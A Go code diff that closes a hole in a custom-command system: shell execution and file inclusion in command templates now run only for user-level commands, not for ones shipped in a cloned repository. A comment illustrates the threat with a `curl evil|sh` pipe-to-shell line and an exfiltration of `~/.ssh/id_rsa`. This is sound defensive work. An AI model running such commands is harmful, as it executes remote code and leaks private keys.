@@ -119,6 +119,15 @@ func scanDir(r *Registry, dir, source string) []string {
 		// Capture template by value so each Cmd's closure has its own
 		// copy (loop iteration shares variable scope otherwise).
 		tmpl := template
+		// Trust gate: !`cmd` shell execution and @file inclusion only run
+		// for USER-level commands (~/.metis/commands). Project-local
+		// commands (cwd/.metis/commands) come from whatever repo you
+		// opened — a cloned hostile repo could ship a command whose body
+		// runs `!`curl evil|sh`` or exfiltrates `@~/.ssh/id_rsa`. For those
+		// the injections are left as inert literal text; $ARGUMENTS/$1
+		// substitution still works. Mirrors the project-trust boundary
+		// claude-code applies to repo-supplied automation.
+		trusted := source == "user"
 		r.Register(Cmd{
 			Name:         base,
 			Description:  desc,
@@ -126,7 +135,7 @@ func scanDir(r *Registry, dir, source string) []string {
 			Model:        meta.model,
 			Custom:       true,
 			Handler: func(args string) (string, Signal) {
-				return renderTemplate(tmpl, args), SignalCustomPrompt
+				return renderTemplate(tmpl, args, trusted), SignalCustomPrompt
 			},
 		})
 		names = append(names, base)
@@ -228,14 +237,16 @@ var fileInjectRe = regexp.MustCompile(`@([A-Za-z0-9_./\-]+)`)
 
 // renderTemplate expands a custom-command template in this order:
 //
-//	$ARGUMENTS / $1 / $2 …   → argument substitution
-//	!`cmd`                   → run cmd in cwd, inject stdout (5s cap)
-//	@path                    → inject the file's contents if it exists
+//	$ARGUMENTS / $1 / $2 …   → argument substitution (always)
+//	!`cmd`                   → run cmd in cwd, inject stdout (trusted only)
+//	@path                    → inject the file's contents     (trusted only)
 //
 // Argument refs don't escape (author owns the body, output goes to the
-// LLM not a shell). !`cmd` IS a real shell exec — the author wrote the
-// command file, same trust model as claude-code's command injection.
-func renderTemplate(template, args string) string {
+// LLM not a shell). The !`cmd` shell exec and @file include are gated on
+// `trusted` (user-level commands only) — see scanDir — so a project-local
+// command from an untrusted repo can't run shell or read arbitrary files
+// just by being invoked.
+func renderTemplate(template, args string, trusted bool) string {
 	out := strings.ReplaceAll(template, "$ARGUMENTS", args)
 	parts := strings.Fields(args)
 	for i, p := range parts {
@@ -245,8 +256,10 @@ func renderTemplate(template, args string) string {
 	for i := len(parts) + 1; i <= 9; i++ {
 		out = strings.ReplaceAll(out, "$"+itoa(i), "")
 	}
-	out = expandBashInjections(out)
-	out = expandFileInjections(out)
+	if trusted {
+		out = expandBashInjections(out)
+		out = expandFileInjections(out)
+	}
 	return strings.TrimSpace(out)
 }
 
